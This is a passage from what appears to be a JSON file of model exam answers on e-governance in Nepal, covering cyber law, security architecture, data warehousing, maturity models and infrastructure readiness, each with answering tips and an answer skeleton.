municipal and district services remain level 2 to 3: forms downloadable but submitted physically, separate departmental databases, repeated documents. Level 5 is rare because a common linking key and interoperability framework are still maturing, though the National ID is the right foundation. Write the level, then two pieces of evidence."},"egov-18":{"u":3,"logic":"Tests institutional readiness, the pillar students skip because it is not technical. The e-readiness framework half checks structured recall.","how":"Define institutional preparedness and give three reasons it matters, then list the five e-readiness pillars. Use 'technology fails where institutions are not ready' as the thesis line.","skel":["Define institutional preparedness","Its elements: authority, coordination, rules","Why it matters: ownership and mandate","E-readiness framework: five pillars","Nepal: nodal agency and coordination gap"],"ans":"Institutional infrastructural preparedness is the readiness of government's organisations, rules and people to run e-governance: a designated e-governance authority or CIO in each ministry, coordination between ministries and tiers, change management and training, procurement and PPP rules, budget lines and performance accountability.\nWhy important: technology fails where institutions are not ready — duplicated projects, no owner, no mandate to compel data sharing, staff resistance, procurement delay. The institution is the delivery mechanism; a portal without an owner decays within a year.\nE-readiness framework components:\n• Infrastructure: connectivity, bandwidth, devices, reliable power.\n• Affordability and access: cost, penetration, rural reach.\n• Human skills: literacy, trained staff, digital awareness.\n• Business and legal environment: cyber law, e-payment, PPP.\n• Government adoption: online services, leadership, IT Policy and Digital Nepal Framework.\nNepal: the National Information Technology Centre is the nodal body; weak inter-ministry coordination and staff transfer are the recurring gaps."},"egov-19":{"u":4,"logic":"Near-identical to the security model question. The examiner wants a management cycle with named stages, so a product list scores poorly.","how":"This repeats the security model — a sure shot. Write it as a six-stage cycle ending in PDCA, and name ISO 27001 and the National CERT once each.","skel":["Define as continuous management cycle","Governance and policy stage","Risk assessment with the risk formula","Controls, monitoring, incident response","Audit, training, continuous improvement"],"ans":"The security management model for e-government is a continuous cycle that keeps security aligned with services, rather than a one-time technical fix.\n• Governance and policy: security policy, data classification, roles such as a CISO, legal compliance.\n• Risk assessment: inventory assets, then risk = threat × vulnerability × impact, prioritised by impact on critical services.\n• Control implementation: physical, network, host, application, data and identity controls in depth.\n• Monitoring and incident response: logs and SIEM, alerts, CERT coordination, containment and recovery.\n• Audit and compliance: internal and external audit, ISO/IEC 27001, penetration testing.\n• Awareness and training: phishing drills, acceptable-use policy, background checks.\n• Continuous improvement: lessons feed back into policy under PDCA.\nCross-cutting: least privilege, segregation of duties, need-to-know. Nepal: the National CERT under MoCIT handles incidents and the Cyber Security Policy 2077 sets direction. The model is people plus process plus technology, and audit makes it real."},"egov-20":{"u":5,"logic":"Tests transfer of the same two concepts across three named sectors. Marks come from sector-specific uses, not from repeating the definition.","how":"One line of definition, then three blocks of three bullets: planning, commerce, rural development. Attach a Nepali institution to each block.","skel":["Define warehouse and mining briefly","Planning: projections, SDG dashboards","Commerce: revenue trends, price monitoring","Rural: beneficiary lists, leakage, gap maps","Nepali institutions named per block"],"ans":"A data warehouse stores integrated historical data; data mining finds patterns in it. Government uses both for evidence-based decisions.\nPlanning:\n• Population and migration projections from the census warehouse for budget allocation and delimitation.\n• SDG and periodic-plan dashboards — National Planning Commission indicators by district.\n• District profiles built from census plus administrative data.\nCommerce:\n• Import, export and revenue trend analysis; Customs and IRD mining for under-invoicing and VAT fraud.\n• Essential-commodity price warehouse: weekly market prices feed inflation and supply decisions.\n• Outlier detection flags abnormal spikes in rice, oil and vegetables.\nRural development:\n• Beneficiary selection and de-duplication for allowances by matching National ID with scheme lists.\n• Leakage detection — ghost beneficiaries, duplicate payments.\n• Infrastructure gap maps from ward data to prioritise roads, water and health posts.\n• Agriculture: yield forecasting and subsidy targeting.\nCaution: poor data quality produces confident wrong answers, so clean before mining."},"egov-21":{"u":6,"logic":"Two-part case question: an Indian municipal package applied to Nepal, plus lessons from Bhoomi. Testing whether you can extract transferable design principles.","how":"Five lines on Smart Nagarpalika modules and local value, then five Bhoomi lessons written as principles, each mapped to Nepal's land offices.","skel":["Smart Nagarpalika: modules","Why municipalities matter for e-governance","Bhoomi: digitise records before counters","Remove middlemen; legal digital record","Apply to Nepal's land revenue offices"],"ans":"Smart Nagarpalika is an e-governance package for municipalities: property tax assessment and collection, water and utility billing, birth and death registration, trade licensing, grievance registration, double-entry accounting and MIS dashboards for the elected body.\nRole at local level: municipalities are where citizens meet government most often, so digitising tax, billing and certificates raises revenue, cuts queues and leakage, and gives ward-level data for planning. It also makes accountability visible — dues, receipts and complaint status go online.\nLessons from Bhoomi (Karnataka land records):\n• Digitise the record before the counter — over twenty million RTCs went online before kiosk printing.\n• Remove the intermediary: a printed RTC at a fixed fee destroyed the broker's rent.\n• Make the digital record legally valid.\n• Charge a small transparent fee so kiosks fund themselves.\n• Keep a correction route, or errors become permanent.\nFor Nepal: land revenue offices already issue computerised records; next come a legally valid digital RTC, ward-level kiosks and National ID linkage."},"egov-22":{"u":3,"logic":"A two-topic short answer. Students define interoperability well and then treat cloud governance as 'using cloud', which loses the policy marks.","how":"Half the page on interoperability components and importance, half on cloud governance as six policy items. Finish with the lock-in warning.","skel":["Interoperability: definition and components","Importance in one line","Cloud governance: adoption and residency","Security, SLA, cost, exit strategy","Nepal: shared data centre; lock-in risk"],"ans":"Interoperability framework: standards, policies and shared components letting separate government systems exchange data — common identifiers such as the National ID, data and metadata standards, APIs and XML/JSON schemas, middleware or an ESB, identity federation, e-payment gateway, digital signature, security standards, and a governance body that approves them. Importance: single window, submit-once, lower cost, analytics, no vendor lock-in.\nCloud governance is the rule set for buying and running cloud in government:\n• Adoption policy: which services go to public, private, community or hybrid cloud.\n• Data residency and classification: sensitive citizen data stays in-country or certified.\n• Security and privacy: encryption, access control, breach notification, audit rights.\n• SLA, availability and disaster recovery commitments.\n• Cost control, capacity planning and chargeback.\n• Exit strategy and data portability against lock-in.\nNepal: the Government Integrated Data Centre gives shared hosting; without residency and exit clauses, ministries depend on one vendor."},"egov-23":{"u":2,"logic":"Tests whether you can connect transparency mechanisms to a real political moment without turning it into a protest essay. Evidence and mechanism earn marks.","how":"Two definitions, four mechanisms, then four engagement tools tied to the Gen-Z protests, and end with the 'voice without consequence' caveat.","skel":["Transparency via publication","Accountability via audit trails","Four mechanisms with Nepali examples","Gen-Z: petition threshold, open drafts","Risk: complaint theatre without response"],"ans":"E-governance improves transparency by publishing what was internal: budgets, tenders, decisions, beneficiary lists, fees and processing times. It improves accountability through audit trails — every application, approval and payment leaves a timestamped log tied to an officer, so delay and discretion become attributable.\nMechanisms:\n• Open data and proactive disclosure of budgets, projects and asset declarations.\n• Status tracking with a case ID and a service-level clock.\n• Grievance systems with escalation, such as Hello Sarkar.\n• Citizen charters, feedback ratings and social audit.\n• Digital payments that bypass cash handlers.\nEngagement and the Gen-Z protests: the 2082 protests were organised on social media and exposed corruption and unresponsive institutions. Platforms can convert that energy into governance:\n• An e-petition threshold forcing a formal published response.\n• Draft laws and budgets open for online comment.\n• Live dashboards on spending and recruitment.\n• Complaint IDs the public can track and reopen if falsely closed.\nRisk: without a mandated response, platforms become complaint theatre — voice without consequence."},"egov-24":{"u":4,"logic":"Tests cyber law applied to two assets — infrastructure and citizen data — with Nepali legal grounding. Do not invent section numbers; Act names only.","how":"Name the Electronic Transactions Act 2063 and Cyber Security Policy 2077, then two blocks: infrastructure protection and data protection, closing on enforcement gaps.","skel":["Name the legal base, no section numbers","Protects infrastructure: offences, deterrence","Signatures, evidence, tribunal","Protects citizen data: confidentiality, privacy","Gaps: enforcement, no data protection Act"],"ans":"Cyber law covers electronic records, digital signatures, cybercrime and data handling. Nepal's core is the Electronic Transactions Act, 2063, with the Cyber Security Policy 2077; a data protection statute is still awaited.\nProtecting government infrastructure:\n• Criminalises unauthorised access, damage to source code, data tampering and denial of service, deterring attacks on government systems.\n• Recognises digital signatures, enabling authentication and non-repudiation for official transactions.\n• Admits electronic evidence and provides adjudicating machinery for speedy remedy.\n• Creates liability for agencies and vendors handling government records negligently.\nProtecting citizen data:\n• Confidentiality obligations on agencies holding personal data, with penalties for misuse and wrongful disclosure.\n• Offences covering identity misuse, forgery of electronic records and illegal publication of private material.\n• Consent and purpose limitation are only partly covered — the gap a Data Protection Act must fill.\nGaps: weak forensic capacity, low incident reporting, and provisions lagging behind ransomware and cloud attacks."},"egov-25":{"u":1,"logic":"A broad benefits question where weaker answers list only citizen convenience. Full marks need government-side and societal benefits plus a justification and example.","how":"Three benefit blocks — citizen, government, society — then a necessity paragraph on Nepal's geography, then one worked example such as IRD e-filing.","skel":["Citizen benefits: access, cost, speed, transparency","Government benefits: efficiency, data, less corruption","Societal benefits: inclusion, trust, jobs","Necessity: dispersed population, manual records","Example: IRD e-filing end to end"],"ans":"Benefits for citizens:\n• 24×7 access from anywhere, no travel or queue — a passport appointment booked from home.\n• Lower cost and no middleman: published fees and digital payment receipts.\n• Faster service with status tracking and a remedy when delayed.\n• Transparency: rules, fees and entitlement visible, leaving less room to demand bribes.\n• Inclusion through assisted channels — service centres, SMS, IVR.\nBenefits for government:\n• Efficiency and cost saving: fewer counters, automated workflow, less paper.\n• Better data for planning from integrated registers and analytics.\n• Reduced corruption through audit trails, digital payments and rule-based approvals.\n• Faster inter-department coordination through shared data.\n• Measurable performance and improved public trust.\nFor society: accountability, financial inclusion, digital jobs and faster disaster response.\nWhy necessary: Nepal's population is scattered across hills and mountains; physical counters cannot reach everyone, and manual records are slow, forgeable and duplicated. Example: a taxpayer in Biratnagar files VAT through IRD's portal, pays online and receives an instant receipt, while IRD gets real-time revenue data — replacing several trips and manual receipts."},"egov-26":{"u":2,"logic":"Tests why models exist at all, then depth on two contrasting ones. The contrast is the discriminator: one-way exposure versus two-way transaction.","how":"One paragraph on why models are needed, then critical flow and interactive service side by side, then a three-line comparison of direction, cost and maturity.","skel":["Why models: choose the right intervention","Critical flow: selective, to watchdogs","Interactive: closed loop with transaction","Compare direction, cost, maturity","Nepali example for each"],"ans":"An e-governance model is a pattern describing how ICT moves information or authority between government and citizens. Models are necessary because they tell a government which intervention fits which failure: information gaps need broadcasting, corruption needs critical flow, participation needs mobilisation, service delay needs interactive service. Without a model, digitisation becomes a website with no purpose.\nCritical Flow Model: selective channelling of sensitive, high-value information to those with power to act.\n• Direction: government → watchdogs, not to everyone.\n• Content: asset declarations, tender documents, audit reports, pollution data.\n• Example: CIAA asset disclosures and public procurement notices in Nepal.\n• Effect: accountability by exposure, with no transaction at all.\nInteractive Service Model (G2C2G): a two-way transaction whose response feeds back into the government process.\n• Direction: government ↔ citizen, a closed loop.\n• Content: application, payment, certificate, tracked grievance, feedback.\n• Example: Nagarik App, Hello Sarkar, online tax filing with refund status.\nComparison: critical flow is one-way to a few, cheap, and changes behaviour by exposure; interactive service is two-way with everyone, needs back-office integration, authentication and payment, and changes service by response. Critical flow suits watchdogs; interactive service is the higher maturity and the one citizens judge."},"egov-27":{"u":3,"logic":"Tests breadth first (all infrastructure types) then depth on computing. Students answer only the first half and lose the computing marks.","how":"List five infrastructure types in one line each, then expand computing into six components. Anchor with a municipality hosting its tax system in the national data centre.","skel":["Five infrastructure types briefly","Computing: servers and virtualisation","Data centres, power, cooling, DR","Cloud IaaS/PaaS/SaaS; end-user devices","Storage, backup, service desk; Nepali example"],"ans":"E-governance needs five infrastructure layers:\n• Network: national fibre backbone, provincial and district links, LAN/WAN, intranet, internet gateway with redundancy, last-mile connectivity, bandwidth, firewalls.\n• Computing: servers, virtualisation, cloud, end-user devices, service desk.\n• Data centre: power with UPS and generator, cooling, fire suppression, access control, backup and a DR site.\n• Data: registries, databases, standards, warehouse, backup.\n• Human, legal and institutional: trained staff, cyber law, nodal agency.\nComputing infrastructure in detail:\n• Servers — application, database, mail and file servers, rack or blade with redundancy; virtual machines raise utilisation.\n• Data centres — centralised hosting such as Nepal's Government Integrated Data Centre, with redundancy and DR.\n• Cloud — IaaS for compute and storage, PaaS for hosting, SaaS for e-mail and office, suited to demand spikes and small agencies.\n• End-user and edge devices — ward-office desktops, kiosks, payment terminals, field mobiles.\n• Storage and backup — SAN/NAS with offsite copies and a retention policy.\n• Management — monitoring, patching, capacity planning, service desk.\nExample: a municipality runs its tax system on a virtual server in the national data centre with nightly offsite backup, not on a desktop under a clerk's desk. Draw the layered diagram."},"egov-28":{"u":1,"logic":"A definition plus scope question. The trap is writing a long definition and a short scope list, when the scope is where most of the marks are.","how":"Two-line definition contrasting e-government, then eight scope bullets grouped by relationship and sector. One Nepali example per group.","skel":["Define e-governance; contrast e-government","e-Administration and e-Services","e-Democracy, G2B, G2G, G2E","Sector scope: health, education, judiciary","Backbone: data, analytics, security"],"ans":"E-governance is the application of ICT to the whole process of governance — administration, service delivery and citizen participation — to make government efficient, transparent, accountable and inclusive. It is broader than e-government, which is ICT-enabled service delivery alone.\nScope of ICT in government:\n• e-Administration: file movement, HR and payroll, accounting, procurement, asset management.\n• e-Services (G2C): certificates, licences, utilities, land records, passport, tax, pensions.\n• e-Democracy and participation: online consultation, e-petition, e-voting, open data.\n• G2B: company registration, tenders, customs, taxation.\n• G2G: inter-ministry data sharing and integrated financial management.\n• G2E: employee services, training, payroll and grievances.\n• Sector applications: e-health, e-education, e-agriculture, e-judiciary, e-policing, disaster management.\n• Backbone: databases, data warehouse, analytics and cybersecurity.\nNepal examples: Nagarik App (G2C), IRD e-filing (G2B and G2C), Hello Sarkar (grievance), National ID (identity base). The scope keeps widening as channels and back-office integration improve."},"egov-29":{"u":1,"logic":"A shortened repeat of the ten-mark global-trends question. It rewards the same five headings, compressed, with country names attached.","how":"This repeats the global-trends long question — a sure shot. Five headings, one line each, one country named per line.","skel":["Mobile-first and single apps","Digital identity as foundation","Cloud and shared data centres","Open data and interoperability","AI, blockchain, cyber law, participation"],"ans":"Present global trends in e-governance growth:\n• Mobile-first and app-based delivery: single apps bundling services — India's UMANG, Nepal's Nagarik App.\n• Digital identity as foundation: Aadhaar, e-Estonia's ID-card, Nepal's National ID; every service authenticates to one identity.\n• Cloud and shared infrastructure: government cloud and shared data centres replace departmental server rooms.\n• Interoperability and single window: submit-once, APIs, one-stop portals.\n• Open government data and transparency portals.\n• AI, chatbots and analytics for service and policy.\n• Blockchain pilots for land records and certificates.\n• Cybersecurity, privacy and data-protection laws becoming mandatory.\n• Citizen-centric co-design and G2C2G participation.\n• Developing nations leapfrog via mobile money and biometric ID, while connectivity, literacy and the divide remain binding constraints.\nGrowth now comes from integration and participation, not from more pages online."},"egov-30":{"u":2,"logic":"Ambiguous wording, best read as the maturity level actually achieved as opposed to the one claimed. The examiner wants the scale plus an assessment method.","how":"Interpret 'realised' as achieved, not intended. Give the five levels, then four tests for judging the realised level, then place Nepal.","skel":["Define realised level as achieved, not claimed","Five levels in one line each","Four tests: end to end, payment, integration, grievance","Assess service by service, not nationally","Nepal: transactional islands, interactive average"],"ans":"The realised level of an e-governance model is the maturity stage actually reached in practice, as distinct from what policy claims. It is assessed service by service.\nThe scale:\n1. Information — static pages, notices.\n2. Enhanced — searchable data, downloadable forms.\n3. Interactive — two-way forms, e-mail, status enquiry.\n4. Transactional — whole transaction online with payment and secure authentication.\n5. Connected — integrated, single window, no repeated data.\nFour tests of the realised level:\n• Can the citizen finish the task without visiting an office?\n• Is payment online and receipted?\n• Does the system talk to other departments, or are documents resubmitted?\n• Is there a tracked grievance with a time limit?\nNepal is mixed: level 4 in income tax e-filing, e-passport appointment, company registration and several Nagarik App services; level 2 to 3 in most municipal services. The honest summary is an interactive average with transactional islands, and the gap to the claimed level is the implementation gap."},"egov-31":{"u":2,"logic":"Similar to the good-governance question but framed as impact. The examiner wants model-to-value pairing plus evidence of impact, not a list of principles.","how":"This repeats the good-governance-through-models question — a sure shot. Pair each model with one governance value, then add impact and Nepali evidence.","skel":["Each model targets one governance failure","Broadcasting: transparency; critical flow: accountability","Comparative: effectiveness; mobilisation: participation","Interactive: responsiveness and efficiency","Impact and Nepali evidence per model"],"ans":"Each e-governance model targets a specific governance failure.\n• Broadcasting → transparency: published budgets, entitlements and results remove the state's monopoly on knowledge.\n• Critical flow → accountability: sensitive data routed to media, courts and auditors triggers action.\n• Comparative analysis → effectiveness: rankings and report cards create competitive pressure between districts.\n• Mobilisation and lobbying → participation and consensus: citizens organise, petition and consult.\n• Interactive service → responsiveness and efficiency: transactions and tracked grievances cut delay and discretion.\nImpact on good governance: faster service at lower cost, less corruption through audit trails, better welfare targeting, higher trust, and evidence for policy.\nNepal: Hello Sarkar shows responsiveness, CIAA disclosures accountability, municipal comparisons performance, Nagarik App service integration. One caveat: these impacts appear only where the back office and rules were reformed first — a portal over a broken process merely publishes the breakage."},"egov-32":{"u":3,"logic":"Tests the two preparedness pillars students treat as slogans. Full marks need concrete components and a stated reason for each pillar.","how":"Two halves with equal weight. For each, three components then one 'why necessary' sentence. Use 'systems fail at the counter, not in the code'.","skel":["Human preparedness: skills at all levels","Specialists, retention, change management","Citizen literacy; why necessary","Technological: standards, localisation, legacy","Accessibility, scalability, security; why necessary"],"ans":"Human infrastructural preparedness is the people side — enough skilled staff and digitally literate citizens to run and use e-government.\n• ICT skills in the civil service: basic literacy, data handling, system administration, security awareness.\n• Specialists: developers, database administrators, security analysts and project managers, retained through pay and a career path.\n• Change management and training so staff do not revert to paper.\n• Citizen digital literacy, especially among rural, elderly, women and low-income users.\n• Leadership: an informed CIO in each ministry.\nWhy necessary: systems fail at the counter, not in the code.\nTechnological infrastructural preparedness is the technology side — standards, architecture, localisation, accessibility and sustainability.\n• Open standards and interoperability, so systems connect instead of forming silos.\n• Nepali-language interfaces, Unicode, accessibility for disabled users.\n• Migration from legacy systems with data cleaning.\n• Scalability, redundancy, maintenance and support.\n• Security technology — PKI, encryption, monitoring.\nWhy necessary: without standards every project becomes an island, and without localisation the service excludes the majority it was built for."},"egov-33":{"u":4,"logic":"Tests layered thinking. A flat list of firewalls and antivirus loses the architecture marks; each layer must have its own control.","how":"Draw concentric layers around the data core, then write one line per layer. Add the four cross-cutting principles and two standards.","skel":["Define as defence in depth","Physical, network, host layers","Application, data, identity layers","Monitoring, policy and people","Principles and standards; draw the stack"],"ans":"E-governance security architecture is the layered design protecting government systems, data and identity. The principle is defence in depth: each layer has its own control, so one failure is not fatal.\n• Physical: data-centre access control, CCTV, guards, fire suppression.\n• Network: firewall, IDS/IPS, VPN, segmentation, DDoS protection.\n• Host/OS: patching, hardening, antivirus, least privilege.\n• Application: secure coding, input validation, authentication, session management.\n• Data: encryption at rest and in transit, masking, backup, retention, secure disposal.\n• Identity and access: single sign-on, MFA, role-based access control, PKI and digital signatures.\n• Monitoring and audit: SIEM, centralised logs, incident response, forensics.\n• Policy and people: security policy, training, background checks, vendor contracts.\nPrinciples: least privilege, need-to-know, segregation of duties, fail-safe defaults. Standards: ISO/IEC 27001 for the ISMS, ISO 27002 controls, NIST CSF. Nepal: Cyber Security Policy 2077 and National CERT. Draw concentric rings around the data layer."},"egov-34":{"u":5,"logic":"Tests one dataset in depth: what census data contains and what mining it enables. Generic warehouse theory without census specifics scores low.","how":"Say what census data contains, then five uses with the mining technique named, then one caution about data ageing.","skel":["What census data contains","Planning, budgeting, delimitation","Targeting and clustering districts","Trend analysis and prediction","Ghost beneficiary detection; data ageing caution"],"ans":"The census produces multi-dimensional data — population, households, age, sex, literacy, occupation, migration, housing, disability — every ten years. A census data warehouse integrates it with vital registration and administrative records; mining turns it into knowledge.\nUses:\n• Planning and budgeting: district and ward projections drive schools, health posts, roads and grants.\n• Delimitation of constituencies and ward boundaries.\n• Targeting: clustering districts by literacy, poverty and out-migration to design programmes.\n• Trend analysis: decade-on-decade fertility, urbanisation and migration change; demand prediction.\n• Techniques: association rules linking migration with employment; classification predicting dropout or poverty; outlier detection for anomalous wards.\n• Cross-matching with scheme lists to find ghost beneficiaries or uncovered households.\n• Publication: census portal, district profiles, open data.\nNepal: National Statistics Office census data used for local planning and SDG indicators. Caution: census data ages, so pair it with current administrative data."},"egov-35":{"u":4,"logic":"Two-part short answer: definition then application to government data. Students define well and then repeat the definition instead of applying it.","how":"One-line definition, then five protection mechanisms, then a two-line gap. Use the Act name only — never invent section numbers.","skel":["Define cyber law","Legal validity of records and signatures","Offences and deterrence for government systems","Confidentiality, authentication, evidence","Gap: no data protection statute yet"],"ans":"Cyber law governs computers, networks and electronic records — it gives legal validity to electronic transactions and punishes misuse.\nHow it protects government data:\n• Legal recognition: electronic records and digital signatures are admissible and enforceable, so a database entry is evidence and an e-approval binds. Nepal's Electronic Transactions Act, 2063 provides this.\n• Offences: unauthorised access to a government system, damage to source code, data theft, forgery of electronic records and denial of service are punishable, deterring insiders and outsiders.\n• Confidentiality duty: agencies holding personal data must protect it; wrongful disclosure attracts penalties.\n• Authentication: PKI and digital certificates prevent impersonation of officials and forged orders.\n• Investigation: device seizure, forensic examination, electronic evidence and a tribunal for speedy trial.\n• Vendor liability written into contracts.\nGap: no comprehensive data-protection statute in Nepal and weak enforcement capacity. Law is necessary but not sufficient — controls and audits follow."},"egov-36":{"u":3,"logic":"Short notes on two infrastructure topics. Each needs five or six substantive lines; the common failure is one-line definitions.","how":"Two blocks of five to six lines. Cloud governance as policy elements; data centres as components plus tier and DR.","skel":["Cloud governance: definition","Residency, SLA, security, exit, audit","Data centre: definition and components","Power, cooling, access, network, backup","Tiers and DR; Nepali example"],"ans":"Cloud Governance\nThe policy framework for government cloud adoption: which services and data may move to cloud, at what classification, with which provider. Elements: adoption and procurement policy; data residency; security, encryption and audit rights; SLA and availability; cost control and chargeback; open standards against lock-in; an exit strategy with data portability; compliance with cyber law. Nepal: shared hosting from the Government Integrated Data Centre; a full policy still needs residency and exit clauses.\nData Centres\nA centralised facility hosting servers, storage and network equipment in a controlled environment. Components: redundant power with UPS and generator, precision cooling, fire suppression, raised floor, access control, redundant network links, backup and a separate disaster-recovery site. Tier I to IV reflects redundancy and uptime. Government data centres consolidate ministry systems, cut duplication and enable shared services and DR. Nepal: the Government Integrated Data Centre. Main risk: a single point of failure when the DR site is unbuilt or untested."},"egov-37":{"u":1,"logic":"The classic comparison plus a problem-solution section. Marks split evenly, so a long comparison with three issues fails. Each issue needs a matching solution.","how":"Four-row comparison in words, then five issue-solution pairs. End with the sequencing rule: process, institution, then technology.","skel":["Define e-government and e-governance","Compare scope, nature, actors, example","Five issues with a solution each","Divide, silos, resistance, security, funding","Sequence: process, institution, technology"],"ans":"E-government is the use of ICT by government to deliver services and information to citizens, business and agencies (G2C, G2B, G2G, G2E). Narrow and operational.\nE-governance is the application of ICT to the whole governing process — delivery plus participation, transparency and accountability. Broad and strategic, including civil society and the private sector.\nDifferences: scope (service delivery versus whole governance); nature (operational versus strategic); actors (government to citizen versus all stakeholders); focus (efficiency versus good governance); example (online passport form versus participatory budgeting and open data).\nIssues and solutions:\n• Digital divide → rural broadband, telecentres, assisted counters, Nepali interfaces.\n• Infrastructure gaps → shared data centre, cloud, redundant power, phased rollout.\n• Staff resistance → change management, training, redeployment.\n• Legacy silos → interoperability framework, standards, phased migration.\n• Poor data quality → validation at source, unique ID, audit.\n• Security and privacy risk → layered security, encryption, cyber law, CERT.\n• Funding → PPP, total-cost-of-ownership budgeting, shared services.\n• Procurement corruption → e-tendering and published contracts.\n• Weak institutions → nodal agency with a mandate, CIO in each ministry.\nSequence the fix: process, institution, technology."},"egov-38":{"u":5,"logic":"Tests definitions plus two named applications with technique-level detail. Marks are lost when students describe census data but not what mining does with it.","how":"Define both, name the warehouse architecture, then two application blocks. Each block must name a mining technique, not just a use.","skel":["Define warehouse with four characteristics","Define mining and name techniques","Architecture: source, ETL, warehouse, marts, OLAP","Census: projections, clustering, trends","Commodity prices: OLAP, seasonality, outlier alerts"],"ans":"A data warehouse is a subject-oriented, integrated, time-variant, non-volatile store of data built from multiple source systems to support decision-making. Data mining extracts previously unknown, valid and useful patterns from large data using classification, clustering, association, regression and outlier detection.\nArchitecture to name: source systems → ETL → staging → warehouse → data marts → OLAP and mining → dashboards.\nCensus applications:\n• One population warehouse integrating census, vital registration and survey data.\n• District and ward population projections for budgets, schools, health posts and constituency delimitation.\n• Clustering districts by literacy, poverty and migration profile for targeted programmes.\n• Association rules linking migration with employment and education; classification to predict dropout.\n• Decade-on-decade trend analysis and SDG indicator monitoring.\nPrices of essential commodities:\n• Daily and weekly market prices from districts loaded into a price warehouse.\n• OLAP analysis by commodity, district and time; inflation and seasonal pattern detection.\n• Supply-chain decisions on buffer stock and distribution of subsidised rice and fuel.\n• Outlier detection flags abnormal spikes or hoarding, feeding consumer alerts by SMS or app.\nNepal: National Statistics Office census data and Department of Commerce price monitoring. Value depends on data quality and timeliness."},"egov-39":{"u":2,"logic":"Two models with examples and strengths. The examiner wants the contrast: information pushed out versus information used for comparison.","how":"Two equal halves, each with direction, tools, example, strength, weakness. Draw one fanning arrow and one set of compared bars.","skel":["Broadcasting: one-to-many definition","Tools, Nepali example, strength, weakness","Comparative analysis: definition","Rankings and report cards; example","Both together: information then pressure"],"ans":"Broadcasting / Wider Dissemination Model: government uses ICT to push information out to the widest possible audience.\n• Direction: one-to-many, government → public.\n• Tools: websites, portals, SMS and mobile alerts, radio and TV, social media, notice boards.\n• Content: budget documents, notifications, exam results, disaster warnings, entitlements, service procedures.\n• Example: disaster early-warning SMS in Nepal, SEE results published online, a ministry posting the annual budget.\n• Strength: cheap, fast, wide reach, transparency at low cost.\n• Weakness: one-way, no feedback, information overload, useless to the illiterate or unconnected.\nComparative Analysis Model: government data is compared across regions, departments or time to create pressure for improvement.\n• Direction: government data → public and peer institutions.\n• Tools: rankings, dashboards, report cards, benchmarks, scorecards.\n• Content: district pass rates, hospital performance, municipal tax collection, vaccination coverage.\n• Example: comparing local levels on tax collection and service delivery; citizen report cards on municipal services; school pass-rate tables.\n• Strength: evidence-based advocacy, competitive improvement, no confrontation needed.\n• Weakness: data quality and comparability, gaming of indicators, shaming without capacity to improve.\nConclusion: broadcasting supplies the raw information; comparative analysis turns it into pressure."},"egov-40":{"u":1,"logic":"Tests whether you can organise scope by function, relationship and channel instead of listing services randomly. Content means the actual service areas.","how":"Scope as functions, relationships, levels, channels; content as five named areas. Keep each bullet to one line so the list stays readable.","skel":["Scope: functions and stakeholders","G2C, G2B, G2G, G2E relationships","Three tiers and delivery channels","Content: administration, services, democracy","Sectors and backbone"],"ans":"Scope of e-governance is the range of government activity ICT touches and the stakeholders it serves.\n• Functions covered: administration, service delivery, regulation, revenue, law and order, justice, welfare, development planning.\n• Relationships: G2C, G2B, G2G, G2E.\n• Levels: federal, provincial and local, plus the interfaces between them.\n• Channels: portal, mobile app, kiosk, service centre, SMS/IVR, call centre.\nContent — what it includes:\n• e-Administration: file and workflow, HR, payroll, accounting, procurement, assets.\n• e-Services: certificates, licences, land records, utilities, passport, tax, pensions.\n• e-Democracy: open data, consultation, e-petition, e-voting.\n• Sector e-governance: e-health, e-education, e-agriculture, e-judiciary, e-policing, disaster management.\n• Backbone: infrastructure, standards, security, law, data warehouse, analytics.\nNepal: the Digital Nepal Framework 2076 organises these into eight sectors; Nagarik App, IRD e-filing and Hello Sarkar are concrete content."},"egov-41":{"u":4,"logic":"Similar to the cyber law importance question but Nepal-specific. Marks come from Act names and roles, plus an honest statement of limitations.","how":"This overlaps the cyber-law questions — a sure shot. Name the Act and two policies, give five roles, then two limitations and the reform needed.","skel":["Legal base: ETA 2063, policies","Validity of e-records and signatures","Offences, privacy, enforcement machinery","Enables e-commerce and e-governance","Limitations and reform: data protection law"],"ans":"Cyber law in Nepal rests on the Electronic Transactions Act, 2063, supported by the Cyber Security Policy 2077, ICT Policy 2072 and the Digital Nepal Framework.\nRoles:\n• Legal recognition of electronic records, digital signatures and electronic contracts — the foundation of paperless government.\n• Criminalises computer offences: unauthorised access, damage to data or source code, forgery, fraud, denial of service.\n• Protects privacy and reputation: penalises identity misuse and electronic publication of private material.\n• Enables e-commerce and e-payment, supporting digital wallets and online tax payment.\n• Provides enforcement: cybercrime investigation, admissibility of electronic evidence, adjudicating bodies for speedy remedy.\n• Supports e-governance projects — e-filing, e-procurement and e-passport need authentication and non-repudiation.\n• Builds trust, attracting IT investment and outsourcing.\nLimitations: no comprehensive data-protection statute, weak technical investigation capacity, low awareness, and provisions lagging behind modern threats — hence amendment and a dedicated privacy law."},"egov-42":{"u":2,"logic":"A compressed repeat of the maturity model. The examiner checks the five names in order plus one distinguishing feature each.","how":"This repeats the maturity question — a sure shot. Five numbered levels, one line each, then the purpose and Nepal's position.","skel":["Define maturity levels","Levels 1-2 in one line each","Levels 3-4 in one line each","Level 5: seamless and proactive","Purpose of the model; Nepal's position"],"ans":"Maturity levels of e-governance are the stages of growth in online government, from presence to integration.\n1. Emerging (Information): static website with notices and documents; one-way.\n2. Enhanced: more content, searchable databases, downloadable forms, still one-way.\n3. Interactive: two-way — e-mail, online forms, status enquiry, simple transactions begin.\n4. Transactional: the whole transaction online with secure authentication and payment — certificate issued, tax paid, licence renewed.\n5. Connected (Seamless): integrated across departments, single window, data entered once, proactive and participatory.\nWhat rises with each level: integration, personalisation, security, back-office reform and participation.\nPurpose: a benchmark for where a government stands and a roadmap for the next step, forcing assessment service by service.\nNepal sits between interactive and transactional — level 4 in tax, passport and company registration; level 2 to 3 in most municipal services."},"egov-43":{"u":3,"logic":"Tests whether e-readiness is understood as a measured assessment, not a slogan. Naming indicators and composite indices is what earns the marks.","how":"List what is assessed under infrastructure, then how it is measured (EGDI, IDI, NRI), then Nepal's standing on three indicators.","skel":["Define e-readiness assessment","Connectivity, devices, power, hosting","Security infrastructure; affordability","Indices: EGDI, IDI, NRI","Nepal: wide mobile, weak fixed broadband and power"],"ans":"E-readiness assessment measures how prepared a country is to use ICT for development and service delivery. Infrastructure preparedness is the largest pillar: whether the physical and technical base exists.\nWhat is assessed:\n• Connectivity: fixed broadband and mobile coverage, international bandwidth, fibre backbone, rural last-mile reach.\n• Access devices: computers, smartphones, kiosks and service centres per capita.\n• Reliability: power supply, uptime, redundancy, disaster recovery.\n• Hosting: data-centre capacity, cloud 